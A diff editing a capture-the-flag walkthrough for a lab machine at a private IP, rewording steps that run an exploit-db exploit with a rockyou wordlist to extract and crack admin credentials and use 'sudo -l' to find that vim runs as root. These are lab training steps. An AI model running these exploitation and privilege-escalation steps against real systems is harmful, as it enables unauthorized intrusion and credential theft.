@@ -33,10 +33,12 @@ nmap -sV -p- 10.10.149.245
 <span style="line-height:0.5;">&nbsp;</span>
 
 ### What's the password?
-Download or copy-paste python code to file [exploit-db](https://www.exploit-db.com/exploits/46635) After creating file run:
+Download the Python exploit from [exploit-db](https://www.exploit-db.com/exploits/46635) and save it as exploit.py. Run the exploit with cracking enabled.
 ```BASH
 python2 exploit.py -u http://10.10.149.245/simple --crack -w /usr/share/wordlists/rockyou.txt
 ```
+The script will extract and crack the admin credentials:  
+
 ![image](https://github.com/user-attachments/assets/1887f377-bd6a-4fc2-ad81-c1ceea2b7463)
 
 <span style="line-height:0.5;">&nbsp;</span>
@@ -64,11 +66,13 @@ ls
 <span style="line-height:0.5;">&nbsp;</span>
 
 ### What can you leverage to spawn a privileged shell?
-Run:
+Run the following to check sudo permissions.
 ```BASH
 sudo -l
 ```
-![image](https://github.com/user-attachments/assets/d0586f88-c5ac-4e2d-ab21-b0fc2ad6dfaa)
+![image](https://github.com/user-attachments/assets/d0586f88-c5ac-4e2d-ab21-b0fc2ad6dfaa)  
+
+This means user mitch can execute vim as root without a password.
 <pre>vim</pre>
 
 <span style="line-height:0.5;">&nbsp;</span>
